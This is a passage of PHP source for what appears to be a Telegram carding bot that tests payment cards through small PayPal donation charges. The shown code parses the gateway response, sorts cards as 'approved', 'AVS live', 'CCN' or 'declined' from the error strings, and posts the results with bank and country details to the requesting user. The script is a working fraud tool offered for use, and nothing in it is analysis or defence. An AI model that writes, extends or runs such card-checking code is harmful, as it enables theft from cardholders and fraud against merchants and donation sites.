$r3 = curl_exec($ch);
curl_close($ch);
$code = getstr($r3, 'code":"', '"');
$msg = getstr($r3, 'message":"', '"');
bot('editMessageText',[
						'chat_id'=>$chat_id,
						'message_id'=>$messageidtopfw,
						'text'=>"<b>
 🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: Paypal 0.5 $ Charge
Status: <code>□□□□■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>",
						'parse_mode'=>'html',

				]);

//=============CHECKER PART END============//

if (
		strpos($r3, 'ADD_SHIPPING_ERROR') ||
		strpos($r3, 'NEED_CREDIT_CARD') ||
		strpos($r3, '"status": "succeeded"') ||
		strpos($r3, 'Thank You For Donation.') ||
		strpos($r3, 'Your payment has already been processed') ||
		strpos($r3, 'Success ') ||
		strpos($r3, '"type":"one-time"') ||
		strpos($r3, '/donations/thank_you?donation_number=')
) {
		$es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
		$msg = "CARD LOADED";
		$code = "CHARGED 0.01$ SUCCESSFULLY 🟢";
} elseif (strpos($r3, 'INVALID_BILLING_ADDRESS')) {
		$es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
		$msg = "INVALID BILLING ADDRESS";
		$code = "AVS LIVE 🟢";
} elseif (strpos($r3, 'INVALID_SECURITY_CODE')) {
		$es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
		$msg = "INVALID SECURITY CODE";
		$code = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗖𝗡 ✅";
} elseif (strpos($r3, 'EXISTING_ACCOUNT_RESTRICTED')) {
		$es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
		$msg = "Existing Account Restricted ";
		$code = "-";
} elseif (strpos($r3, 'is3DSecureRequired')) {
		$es = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
		$msg = "3D SECURE REQUIRED 🟡";
		$code = ".";
} elseif (strpos($r3, 'CARD_GENERIC_ERROR')) {
		$es = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌";
		$msg = "ISSUER_DECLINE";
		$code = "CARD_GENERIC_ERROR";
} else {
		$es = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌";
}



$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//


bot('editMessageText',[
								'chat_id'=>$chat_id,
								'message_id'=>$messageidtopfw,
'text'=>"<b>
Paypal 0.5 $ Charge 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: <code>$es/$code</code>
[ϟ]Result: <code>$msg</code>

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]Time: <code>$time SEC</code> | IP: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
			'parse_mode'=>'html',
								'disable_web_page_preview'=>'true'

						]);
	recordBotResponseTimestamp($userId);



}
